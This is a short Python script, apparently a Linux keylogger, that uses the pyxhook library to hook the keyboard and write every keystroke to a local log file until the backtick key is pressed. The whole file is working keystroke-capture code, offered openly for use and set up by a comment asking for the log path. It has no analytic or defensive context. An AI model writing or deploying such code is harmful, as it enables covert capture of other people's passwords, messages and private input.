import pyxhook
#change this to your log file's path
log_file='/home/pylay/[linux] keylogger/file.log'


def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96: #96 is ascii value of (`) key
    fob.close()
    new_hook.cancel()


new_hook=pyxhook.HookManager()

new_hook.KeyDown=OnKeyPress

new_hook.HookKeyboard()

new_hook.start()
